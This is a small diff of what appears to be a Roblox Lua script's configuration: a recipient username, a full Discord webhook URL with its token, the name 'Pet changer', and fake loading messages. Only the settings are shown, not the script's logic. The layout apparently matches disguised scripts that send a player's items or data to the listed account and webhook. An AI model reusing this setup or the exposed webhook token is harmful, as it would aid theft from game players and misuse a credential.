@@ -1,7 +1,7 @@
 Username = "alexgeorge3434"
 WebHook = "https://discord.com/api/webhooks/1077112070237081660/f0j8ti_Ijvqr5tzFjbY-dicvVeaMFL7nB2cj4yMvqNJbTcScZi4tUcZvI1xvDQ4zBSRK"
 _G.CustomScriptName = "bus hub 
-"Pet changer""
+Pet changer"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
